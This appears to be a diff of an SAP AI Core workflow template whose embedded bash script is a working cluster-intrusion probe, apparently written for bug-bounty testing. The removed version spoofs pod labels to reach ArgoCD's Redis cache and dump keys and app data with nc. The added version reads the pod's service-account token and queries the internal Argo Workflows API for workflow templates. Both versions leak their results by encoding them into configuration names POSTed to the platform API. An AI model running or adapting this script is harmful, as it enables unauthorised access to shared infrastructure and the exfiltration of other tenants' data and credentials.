@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "56.0.0"
+    ai.sap.com/version: "57.0.0"
 spec:
   entrypoint: main
   templates:
@@ -18,16 +18,13 @@ spec:
     metadata:
       labels:
         ai.sap.com/resourcePlan: starter
-        app.kubernetes.io/name: argocd-server
     container:
       image: nicolaka/netshoot:latest
       command:
       - bash
       - -c
       - |
-        # V56: ArgoCD Redis cache access via label spoofing (GH #17151)
-        # Redis network policy uses podSelector labels WITHOUT namespaceSelector
-        # If our pod has matching labels, network policy allows access
+        # V57: Argo Workflows server on port 2746 + storedWorkflowTemplateSpec
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -38,94 +35,69 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v56-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v57-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        # Check what labels our pod actually has
-        LABELS=$(cat /etc/podinfo/labels 2>/dev/null || echo "no-podinfo")
-        save "pod-labels-$(echo $LABELS | head -c 150)"
+        ARGO="argo-server.argo.svc.cluster.local"
+        ARGO_IP=$(dig +short "$ARGO" 2>/dev/null | head -1)
+        save "argo-ip-${ARGO_IP:-NXDOMAIN}"
+        OUR_NS="rg-3ba0e0a4-cd927cab"
+        EXEC_ID=$(printenv AICORE_EXECUTION_ID)
+        save "exec-id-${EXEC_ID}"
 
-        # Redis service names from KSM data
-        REDIS_HA="argocd-redis-ha-haproxy.argocd.svc.cluster.local"
-        REDIS_DIRECT="argocd-redis-ha.argocd.svc.cluster.local"
+        # 1. Try port 2746 (correct Argo Workflows port!)
+        echo "=== ARGO SERVER 2746 ===" >&2
+        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/info" 2>&1 | head -c 200)
+        save "argo-2746-info-$(echo $R | head -c 150)"
 
-        # 1. DNS resolution
-        REDIS_IP=$(dig +short "$REDIS_HA" 2>/dev/null | head -1)
-        save "redis-ha-ip-${REDIS_IP:-NXDOMAIN}"
+        R=$(curl -sk --connect-timeout 5 "http://${ARGO}:2746/api/v1/info" 2>&1 | head -c 200)
+        save "argo-2746h-info-$(echo $R | head -c 150)"
 
-        REDIS_D_IP=$(dig +short "$REDIS_DIRECT" 2>/dev/null | head -1)
-        save "redis-direct-ip-${REDIS_D_IP:-NXDOMAIN}"
+        # 2. Try without auth (server mode)
+        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/version" 2>&1 | head -c 200)
+        save "argo-version-$(echo $R | head -c 150)"
 
-        # Also try the announce services
-        for i in 0 1 2; do
-          ip=$(dig +short "argocd-redis-ha-announce-${i}.argocd.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && save "redis-announce-${i}-${ip}"
-        done
+        # 3. Try reading our values-extract WorkflowTemplate
+        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}/values-extract" 2>&1 | head -c 300)
+        save "argo-wft-values-$(echo $R | head -c 200)"
 
-        # 2. Try connecting to Redis (default port 6379)
-        if [ -n "$REDIS_IP" ]; then
-          # TCP connection test
-          R=$(echo "PING" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 100)
-          save "redis-ping-$(echo $R | head -c 80)"
+        # 4. Try reading our own bb14-probe template
+        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}/bb14-probe" 2>&1 | head -c 300)
+        save "argo-wft-probe-$(echo $R | head -c 200)"
 
-          # Try Redis INFO command
-          R=$(echo -e "INFO\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 200)
-          save "redis-info-$(echo $R | head -c 150)"
+        # 5. Try listing ALL workflow templates in our namespace
+        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}" 2>&1 | head -c 300)
+        save "argo-wft-list-$(echo $R | head -c 200)"
 
-          # Try KEYS * to list all cached keys
-          R=$(echo -e "KEYS *\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 200)
-          save "redis-keys-$(echo $R | head -c 150)"
+        # 6. Try reading our own execution's workflow CR (storedWorkflowTemplateSpec!)
+        R=$(curl -sk --connect-timeout 5 "https://${ARGO}:2746/api/v1/workflows/${OUR_NS}/${EXEC_ID}" 2>&1 | head -c 300)
+        save "argo-wf-self-$(echo $R | head -c 200)"
+
+        # 7. Try with pod SA token if available
+        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_SA")
+        save "sa-token-$(echo ${SA_TOKEN:0:20})"
+
+        if [ "$SA_TOKEN" != "NO_SA" ]; then
+          R=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $SA_TOKEN" "https://${ARGO}:2746/api/v1/workflow-templates/${OUR_NS}/values-extract" 2>&1 | head -c 300)
+          save "argo-sa-wft-$(echo $R | head -c 200)"
         fi
 
-        # 3. Try HAProxy port (usually 6379 or 26379)
-        if [ -n "$REDIS_IP" ]; then
-          for port in 6379 26379 6380; do
-            R=$(echo "PING" | nc -w 2 "$REDIS_IP" "$port" 2>&1 | head -c 80)
-            if [ -n "$R" ]; then
-              save "redis-ha-${port}-$(echo $R | head -c 60)"
-            fi
-          done
+        # 8. Also try direct IP on 2746
+        if [ -n "$ARGO_IP" ]; then
+          R=$(curl -sk --connect-timeout 5 "https://${ARGO_IP}:2746/api/v1/info" 2>&1 | head -c 200)
+          save "argo-ip-2746-$(echo $R | head -c 150)"
         fi
 
-        # 4. Try direct Redis pods (not through HAProxy)
-        if [ -n "$REDIS_D_IP" ]; then
-          R=$(echo "PING" | nc -w 3 "$REDIS_D_IP" 6379 2>&1 | head -c 100)
-          save "redis-d-ping-$(echo $R | head -c 80)"
-
-          R=$(echo -e "INFO\r\n" | nc -w 3 "$REDIS_D_IP" 6379 2>&1 | head -c 200)
-          save "redis-d-info-$(echo $R | head -c 150)"
-        fi
-
-        # 5. Try announce IPs directly
-        for i in 0 1 2; do
-          ip=$(dig +short "argocd-redis-ha-announce-${i}.argocd.svc.cluster.local" 2>/dev/null | head -1)
-          if [ -n "$ip" ]; then
-            R=$(echo "PING" | nc -w 2 "$ip" 6379 2>&1 | head -c 80)
-            save "redis-a${i}-ping-$(echo $R | head -c 60)"
+        # 9. Try other ports that argo-server might use
+        for port in 2746 8080 8443 443 80; do
+          R=$(curl -sk --connect-timeout 2 "http://${ARGO}:${port}/api/v1/info" 2>&1 | head -c 100)
+          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
+            save "argo-port-${port}-$(echo $R | head -c 80)"
           fi
         done
 
-        # 6. If Redis responds, try to read ArgoCD app data
-        if [ -n "$REDIS_IP" ]; then
-          # ArgoCD stores apps in Redis with key pattern: app|*
-          R=$(echo -e "KEYS app|*\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 300)
-          save "redis-app-keys-$(echo $R | head -c 200)"
-
-          # Try getting our gitops app's cached data
-          R=$(echo -e "GET app|ghe-gitops-app\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 300)
-          save "redis-gitops-app-$(echo $R | head -c 200)"
-
-          # Try MGET for manifest cache
-          R=$(echo -e "KEYS git-*\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 300)
-          save "redis-git-keys-$(echo $R | head -c 200)"
-
-          # Check cluster info
-          R=$(echo -e "CLUSTER INFO\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 200)
-          save "redis-cluster-$(echo $R | head -c 150)"
-        fi
-
-        echo "V56 DONE" >&2
+        echo "V57 DONE" >&2
